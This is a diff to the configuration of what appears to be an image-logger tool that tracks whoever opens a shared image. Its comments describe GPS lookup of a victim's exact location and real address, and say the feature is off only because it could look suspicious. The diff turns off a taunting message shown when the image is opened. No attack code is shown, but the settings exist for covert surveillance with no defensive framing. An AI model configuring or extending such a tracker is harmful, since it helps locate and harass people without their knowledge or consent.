@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "𝑰𝑪𝑯 𝑾𝑬𝑰𝑺 𝑫𝑨𝑺 𝑫𝑼 𝑨𝑼𝑭 𝑴𝑰𝑨 𝑮𝑶𝑶𝑵𝑺𝑻", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
